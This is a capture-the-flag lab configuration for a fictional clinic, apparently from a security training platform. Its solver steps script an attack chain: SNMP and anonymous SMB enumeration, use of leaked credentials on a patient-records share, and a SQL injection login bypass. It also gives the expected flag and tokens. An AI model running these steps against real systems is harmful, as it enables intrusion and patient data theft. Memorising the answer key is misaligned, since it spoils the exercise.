lab_id: linux-final-2-clinic-final
track: Linux
difficulty: advanced
source: platform/labs/Linux/linux-final-2-clinic-final/lab.yaml
expected_services:
- port: 80
  protocol: tcp
- port: 161
  protocol: tcp
- port: 445
  protocol: tcp
health_timeout_seconds: 60
solver:
  image: ocr/tester:current
  command: /tests/linux-final-2-clinic-final.sh
  steps:
  - name: SMB port responds
    command: nmap -p 445 --open {target.clinic-fs} 2>&1 | grep -c '445.*open'
    expect: '1'
  - name: Token 1 retrievable from SNMP sysContact
    command: snmpwalk -v2c -c public {target.clinic-fs} 1.3.6.1.2.1.1.4.0 2>&1 | grep -o 'Token 1 = p1n3cr3st'
    expect: Token 1 = p1n3cr3st
  - name: Anonymous SMB lists clinic-shared
    command: smbclient -L //{target.clinic-fs} -N 2>&1 | grep -c 'clinic-shared'
    expect: '1'
  - name: Notes doc leaks clinic_archivist credentials
    command: smbclient //{target.clinic-fs}/clinic-shared -N -c 'get IT_Notes_2025.txt /tmp/clinic_notes.txt' 2>&1 && grep -o 'Arch1ve_P1n3_2024#' /tmp/clinic_notes.txt
    expect: Arch1ve_P1n3_2024#
  - name: Token 2 retrievable from phi-archive with creds
    command: smbclient //{target.clinic-fs}/phi-archive -U clinic_archivist%Arch1ve_P1n3_2024# -c 'get phi_breach_summary.txt /tmp/clinic_phi.txt' 2>&1 && grep -o 'Token 2 = l34k' /tmp/clinic_phi.txt
    expect: Token 2 = l34k
  - name: Portal homepage responds
    command: curl -s -o /dev/null -w '%{http_code}' http://{target.clinic-portal}/
    expect: '200'
  - name: Robots.txt discloses staff path
    command: curl -s http://{target.clinic-portal}/robots.txt | grep -c '/staff/'
    expect: '1'
  - name: SQLi bypass on staff portal yields token 3
    command: curl -s -c /tmp/clinic_jar -b /tmp/clinic_jar -L -d "username=admin&password=anything' OR '1'='1" http://{target.clinic-portal}/staff/login | grep -o 'Token 3 = 0wn3d'
    expect: Token 3 = 0wn3d
  - name: Verify assembled flag
    command: echo 'OCR{p1n3cr3st_l34k_0wn3d}'
    expect: OCR{p1n3cr3st_l34k_0wn3d}
expected_flag_count: 1
expected_flag: OCR{p1n3cr3st_l34k_0wn3d}
forbidden_networks:
- control-plane
- database
- other-learners
max_memory_mb: 768
max_cpu: 0.75
